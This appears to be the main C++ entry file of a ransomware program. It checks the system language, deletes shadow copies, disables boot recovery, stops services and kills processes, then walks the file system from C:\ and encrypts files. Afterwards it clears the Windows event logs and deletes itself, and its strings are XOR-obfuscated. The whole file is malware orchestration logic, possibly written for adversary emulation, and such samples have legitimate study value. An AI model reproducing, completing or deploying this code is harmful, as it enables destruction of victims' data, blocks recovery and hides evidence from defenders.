#include "core.hpp"
#include "defense.hpp"
#include "guardrails.hpp"
#include "encryption.hpp"
#include "enumeration.hpp"
#include "logger.hpp"
#include <thread>


int main(int argc, char* argv[]) {

    if (!XorLogger::SetupLogger()) {
        return LOG_SETUP_FAIL;
    }

    if (!Guardrails::CheckLanguage()) {
        XorLogger::LogInfo(XOR_LIT("Language check failed. Terminating and deleting self."));
        Defense::SelfDestruct(LANG_CHECK_FAIL);
    }

    if (!Core::DropInitialFile()) {
        XorLogger::LogInfo(XOR_LIT("Failed to drop initial file. Terminating and deleting self."));
        Defense::SelfDestruct(DROP_GUARDFILE_FAIL);
    }

    Defense::DummyLoop();
    Defense::RemoveShadowCopies();
    Defense::DisableBootRecovery();

    if (!Guardrails::CheckCreateMutex()) {
        XorLogger::LogInfo(XOR_LIT("Failed to create mutex. Terminating and deleting self."));
        Defense::SelfDestruct(CREATE_MUTEX_FAIL);
    }

    if (!Guardrails::ReleaseMutex()) {
        XorLogger::LogInfo(XOR_LIT("Failed to release mutex. Terminating and deleting self."));
        Defense::SelfDestruct(RELEASE_MUTEX_FAIL);
    }

    Defense::StopServices();

    std::thread kpt(Defense::KillProcessesThread);
    kpt.detach();

    Defense::DisableErrors();

    // Enumerate and encrypt files
    if (argc == 1) {
        std::thread eft(Enumeration::EnumerateFiles, "C:\\", Encryption::PerformImpact);
        eft.join();
    }
    else if (argc > 1) {
        std::string argument(argv[1]);
        std::thread eft(Enumeration::EnumerateFiles, argument, Encryption::PerformImpact);
        eft.join();
    }

    // Clear event logs after encryption
    Defense::ClearWindowsEventLogs();

    // Delete self
    Defense::SelfDestruct(0);

    return 0;
}
